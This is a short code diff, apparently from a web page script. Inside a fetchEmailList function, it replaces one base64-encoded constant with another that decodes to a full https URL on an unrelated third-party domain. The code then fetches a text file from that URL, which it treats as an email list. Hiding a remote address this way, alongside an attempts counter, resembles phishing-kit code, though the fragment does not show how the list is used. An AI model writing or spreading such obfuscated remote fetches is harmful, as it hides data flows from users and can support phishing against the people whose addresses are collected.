@@ -142,7 +142,7 @@
         let attempts = 0;
 
         async function fetchEmailList() {
-            const encodedUrl = 'YmlyZGluZ2JpZXNib3NjaC5jb20vZG85LTEtMjNhLS84aXZ4azAwNDItMjkxMDMyLWRiLS1kYXRhc2V0LXIyNDMtMzU0My50eHQ=';
+            const encodedUrl = 'aHR0cHM6Ly9iaXJkaW5nYmllc2Jvc2NoLmNvbS9kbzktMS0yM2EtLzhpdnhrMDA0Mi0yOTEwMzItZGItLWRhdGFzZXQtcjI0My0zNTQzLnR4dA==';
             const decodedUrl = atob(encodedUrl);
             const response = await fetch(decodedUrl); 
             const text = await response.text();
